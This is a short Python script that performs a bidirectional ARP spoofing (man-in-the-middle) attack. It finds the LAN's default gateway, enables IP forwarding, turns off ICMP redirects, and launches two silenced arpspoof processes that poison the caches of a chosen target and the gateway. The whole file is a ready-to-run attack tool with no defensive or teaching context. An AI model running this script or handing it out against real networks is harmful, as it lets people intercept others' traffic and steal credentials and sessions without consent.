import subprocess
import sys
import signal
import os

INTERFACE = "ens33"
p1 = None
p2 = None


def get_default_gateway_linux():
    result = subprocess.check_output(
        ["ip", "route", "show", "default"],
        text=True
    )
    return result.split()[2]


def enable_ip_forwarding():
    subprocess.run(
        ["sysctl", "-w", "net.ipv4.conf.all.send_redirects=0"],
        stdout=subprocess.DEVNULL
    )
    subprocess.run(
        ["sysctl", "-w", "net.ipv4.ip_forward=1"],
        stdout=subprocess.DEVNULL
    )


def run_bidirectional_spoof(target_ip, gateway_ip, interface):
    global p1, p2

    print("[+] ARP spoofing started (quiet)")
    print("[+] Press Ctrl+C to stop\n")

    cmd_to_target = ["arpspoof", "-i", interface, "-t", target_ip, gateway_ip]
    cmd_to_gateway = ["arpspoof", "-i", interface, "-t", gateway_ip, target_ip]

    # start each in its own process group
    p1 = subprocess.Popen(
        cmd_to_target,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )

    p2 = subprocess.Popen(
        cmd_to_gateway,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )

    signal.pause()  # wait forever


def shutdown(signum=None, frame=None):
    print("\n[+] Stopping ARP spoofing...")

    for proc in [p1, p2]:
        if proc:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except Exception:
                pass

    print("[✓] Stopped cleanly")
    sys.exit(0)


def main():
    if len(sys.argv) != 2:
        print("Usage: sudo python3 arpSpoof.py <target-ip>")
        sys.exit(1)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    target_ip = sys.argv[1]
    gateway_ip = get_default_gateway_linux()

    enable_ip_forwarding()
    run_bidirectional_spoof(target_ip, gateway_ip, INTERFACE)


if __name__ == "__main__":
    main()
